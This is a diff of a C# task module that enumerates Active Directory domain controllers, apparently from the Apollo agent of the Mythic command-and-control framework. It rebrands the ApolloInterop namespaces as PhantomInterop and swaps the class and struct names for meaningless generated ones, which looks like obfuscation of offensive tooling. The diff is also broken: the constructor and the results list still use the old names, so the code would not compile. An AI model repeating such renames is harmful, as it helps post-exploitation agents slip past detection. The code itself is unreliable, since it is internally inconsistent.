@@ -6,9 +6,9 @@
 
 #if NET_DCLIST
 
-using ApolloInterop.Classes;
-using ApolloInterop.Interfaces;
-using ApolloInterop.Structs.MythicStructs;
+using PhantomInterop.Classes;
+using PhantomInterop.Interfaces;
+using PhantomInterop.Structs.MythicStructs;
 using System;
 using System.Collections.Generic;
 using System.DirectoryServices.ActiveDirectory;
@@ -17,10 +17,10 @@ using System.Net;
 
 namespace Tasks
 {
-    public class net_dclist : Tasking
+    public class AdvancedEngine95BA : Tasking
     {
         [DataContract]
-        internal struct NetDomainController
+        internal struct IntelligentRouter23AF
         {
             [DataMember(Name = "computer_name")]
             public string ComputerName;
@@ -35,7 +35,7 @@ namespace Tasks
             [DataMember(Name = "global_catalog")]
             public bool IsGlobalCatalog;
         }
-        public net_dclist(IAgent agent, ApolloInterop.Structs.MythicStructs.MythicTask data) : base(agent, data)
+        public net_dclist(IAgent agent, PhantomInterop.Structs.MythicStructs.MythicTask data) : base(agent, data)
         {
         }
 
@@ -45,7 +45,7 @@ namespace Tasks
             DirectoryContext ctx;
             DomainControllerCollection dcCollection;
             List<NetDomainController> results = new List<NetDomainController>();
-            if (string.IsNullOrEmpty(_data.Parameters))
+            if (ValidationHelper.IsStringEmpty(_data.Parameters))
                 ctx = new DirectoryContext(DirectoryContextType.Domain);
             else
                 ctx = new DirectoryContext(DirectoryContextType.Domain, _data.Parameters.Trim());
